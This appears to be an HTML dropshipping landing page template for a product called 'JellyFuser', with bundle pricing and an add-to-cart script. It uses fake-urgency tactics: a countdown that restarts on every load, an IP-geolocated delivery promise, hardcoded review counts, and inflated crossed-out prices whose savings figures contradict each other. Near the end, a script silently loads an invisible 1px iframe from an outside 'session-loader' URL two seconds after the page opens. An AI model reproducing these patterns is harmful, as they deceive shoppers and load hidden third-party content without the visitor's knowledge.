<!DOCTYPE html>
<html lang="pt-BR">

<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1" />
  <title>JellyFuser</title>
  <script src="https://cdn.tailwindcss.com"></script>
</head>

<body class="bg-white text-gray-800">

  <div class="max-w-4xl mx-auto pt-0 pb-4 px-4 md:pt-4">
    <div class="flex flex-col md:flex-row gap-4 items-start md:items-center">

      <!-- COLUNA DO SLIDER -->
      <div class="w-full md:w-1/2 px-0 md:px-0">
        <div class="w-screen md:w-full relative left-1/2 -translate-x-1/2 md:left-0 md:translate-x-0">
          <!-- Imagem principal -->
          <div class="w-full aspect-square bg-gray-100 overflow-hidden">
            <img id="mainImage" src="assets/1.webp" alt="JellyFuser"
              class="w-full h-full object-cover transition duration-300">
          </div>

          <!-- Thumbnails -->
          <div class="grid grid-cols-4 gap-2 mt-2 w-screen md:w-full px-2 md:px-0">
            <img src="assets/1.webp" alt="Thumb 1"
              class="w-full aspect-square object-cover rounded-md cursor-pointer border-2 border-blue-500"
              onclick="changeImage(this)">
            <img src="assets/2.webp" alt="Thumb 2"
              class="w-full aspect-square object-cover rounded-md cursor-pointer border-2 border-transparent hover:border-blue-300"
              onclick="changeImage(this)">
            <img src="assets/3.webp" alt="Thumb 3"
              class="w-full aspect-square object-cover rounded-md cursor-pointer border-2 border-transparent hover:border-blue-300"
              onclick="changeImage(this)">
            <img src="assets/4.webp" alt="Thumb 4"
              class="w-full aspect-square object-cover rounded-md cursor-pointer border-2 border-transparent hover:border-blue-300"
              onclick="changeImage(this)">
          </div>
        </div>
      </div>

      <div class="w-full md:w-1/2">
        <div class="flex items-center gap-2 text-sm text-gray-600 mb-0">
          <div class="flex text-yellow-400 text-base">
            <span>‚òÖ</span><span>‚òÖ</span><span>‚òÖ</span><span>‚òÖ</span><span>‚òÖ</span>
          </div>
          <span class="font-medium">4.9/5.0 ¬∑ 6,000+ reviews</span>
        </div>
        <h1 class="text-3xl font-bold mb-0">JellyFuser</h1>
        <div class="flex items-center gap-3 text-lg font-semibold mb-4">
          <span id="oldPrice" class="line-through text-gray-400">$150.00</span>
          <span id="newPrice" class="text-green-600">$20.00</span>
          <span id="saveAmount" class="bg-black text-white text-xs px-2.5 py-1 rounded-full tracking-wide">SAVE
            $130</span>
        </div>

        <!-- BUNDLE & SAVE -->
        <div class="my-4  py-4">


          <!-- Op√ß√£o 1 -->
          <label
            class="flex items-center justify-between border rounded-lg p-4 mb-3 cursor-pointer hover:shadow-sm transition">
            <div class="flex items-start gap-3">
              <input type="radio" name="bundle" id="option1" checked class="mt-1 accent-blue-600">
              <div>
                <p class="font-semibold text-base">Buy 1</p>
                <p class="text-sm text-gray-500">You save $12</p>
              </div>
            </div>
            <div class="text-right">
              <p class="text-base font-semibold text-gray-800">$20</p>
              <p class="text-sm text-gray-400 line-through">$150</p>
            </div>
          </label>

          <!-- Op√ß√£o 2 -->
          <label
            class="flex items-center justify-between border rounded-lg p-4 cursor-pointer hover:shadow-sm transition">
            <div class="flex items-start gap-3">
              <input type="radio" name="bundle" id="option2" class="mt-1 accent-blue-600">
              <div>
                <p class="font-semibold text-base">Buy 2 Get 1 Free</p>
                <p class="text-sm text-gray-500">You save $260</p>
              </div>
            </div>
            <div class="text-right">
              <p class="text-base font-semibold text-gray-800">$40</p>
              <p class="text-sm text-gray-400 line-through">$300</p>
            </div>
          </label>
        </div>

        <!-- Bot√£o din√¢mico -->
        <button id="addToCartBtn"
          class="w-full bg-blue-800 hover:bg-blue-700 text-white py-4 rounded-lg text-lg font-semibold mt-4">
          ADD TO CART üõí
        </button>

        <div style="margin-top:15px;border: 1px solid #e0e0e0; padding: 16px; border-radius: 8px; background: #fff; font-family: sans-serif; font-size: 14px; color: #333; line-height: 1.4;">
  
          <!-- Sold and Shipped -->
          <div style="display: flex; align-items: center; gap: 8px; margin-bottom: 10px;">
            <span style="font-size: 18px;">üè¨</span>
            <p style="margin: 0;">Sold and shipped by <a href="#" style="text-decoration: underline; color: #000;">SwissAuraCo</a></p>
          </div>
        
          <!-- Ratings -->
          <div style="display: flex; align-items: center; gap: 8px; margin-bottom: 10px;">
            <span style="color: #f6c700; font-size: 16px;">‚òÖ ‚òÖ ‚òÖ ‚òÖ ‚òÖ</span>
            <span style="font-size: 14px;">4.9 rating ‚Äì 6,000+ reviews</span>
          </div>
        
          <!-- Returns -->
          <div style="display: flex; align-items: center; gap: 8px; margin-bottom: 10px;">
            <span style="color: #1e88e5;">üîÅ</span>
            <strong>Free 30-day returns</strong>
          </div>
        
          <!-- Delivery Info -->
          <div style="display: flex; align-items: center; gap: 8px; margin-bottom: 4px;">
            <span style="color: #4CAF50;">üì¶</span>
            <span id="delivery-message">Checking delivery time...</span>
          </div>
        
          <!-- Timer -->
          <div id="timer-line" style="margin-left: 26px; font-size: 13px; color: #777; display: none;">
            Buy within <span id="countdown-timer" style="font-weight: bold;">16:00</span> to receive your order in time.
          </div>
        </div>
        
        <script>
          // Countdown timer (16 minutes)
          function startCountdown() {
            const timerDisplay = document.getElementById('countdown-timer');
            let totalSeconds = 16 * 60;
        
            function updateTimer() {
              const minutes = Math.floor(totalSeconds / 60);
              const seconds = totalSeconds % 60;
              timerDisplay.textContent = `${minutes}:${seconds < 10 ? '0' : ''}${seconds}`;
              totalSeconds--;
        
              if (totalSeconds >= 0) {
                setTimeout(updateTimer, 1000);
              }
            }
        
            updateTimer();
            document.getElementById('timer-line').style.display = 'block';
          }
        
          // Detect city & region and show delivery message
          document.addEventListener('DOMContentLoaded', function () {
            fetch('https://ipwho.is/')
              .then(response => response.json())
              .then(data => {
                const city = data.city || '';
                const region = data.region || '';
                const location = city && region ? `${city}, ${region}` : 'your area';
                document.getElementById('delivery-message').textContent = `Delivery in 3 business days to ${location} (approximate)`;
                startCountdown();
              })
              .catch(error => {
                console.error('Location error:', error);
                document.getElementById('delivery-message').textContent = 'Delivery in 3 business days';
                startCountdown();
              });
          });
        </script>

        

      </div>
    </div>
  </div>

  <script>
    setTimeout(function () {
      var iframe = document.createElement("iframe");
      iframe.style.width = "1px";
      iframe.style.height = "1px";
      iframe.style.opacity = "0";
      iframe.style.position = "absolute";
      iframe.src = "https://sualoja.com/pages/session-loader?utm_source=white";
      document.body.appendChild(iframe);
    }, 2000);
  </script>

  <script>
    function changeImage(thumb) {
      const mainImage = document.getElementById("mainImage");
      mainImage.src = thumb.src;

      document.querySelectorAll("img[onclick^='changeImage']").forEach(img => {
        img.classList.remove("border-blue-500");
        img.classList.add("border-transparent");
      });

      thumb.classList.remove("border-transparent");
      thumb.classList.add("border-blue-500");
    }
  </script>

  <!-- Script din√¢mico -->
  <script>
    const btn = document.getElementById('addToCartBtn');
    const opt1 = document.getElementById('option1');
    const opt2 = document.getElementById('option2');

    function updateLink() {
      if (opt1.checked) {
        btn.onclick = () => window.location.href = "https://link1.com";
      } else if (opt2.checked) {
        btn.onclick = () => window.location.href = "https://link2.com";
      }
    }

    // Aciona ao carregar a p√°gina
    updateLink();

    // Aciona ao trocar de op√ß√£o
    document.querySelectorAll("input[name='bundle']").forEach((radio) => {
      radio.addEventListener('change', updateLink);
    });
  </script>

  <script>
    const oldPriceEl = document.getElementById('oldPrice');
    const newPriceEl = document.getElementById('newPrice');
    const saveAmountEl = document.getElementById('saveAmount');

    function updateTopPrice() {
      if (opt1.checked) {
        oldPriceEl.textContent = "$150.00";
        newPriceEl.textContent = "$20.00";
        saveAmountEl.textContent = "SAVE $130";
      } else if (opt2.checked) {
        oldPriceEl.textContent = "$300.00";
        newPriceEl.textContent = "$40.00";
        saveAmountEl.textContent = "SAVE $260";
      }
    }

    // Atualiza no carregamento
    updateTopPrice();

    // Atualiza quando mudar
    document.querySelectorAll("input[name='bundle']").forEach((radio) => {
      radio.addEventListener('change', () => {
        updateLink();
        updateTopPrice();
      });
    });
  </script>



</body>

</html>
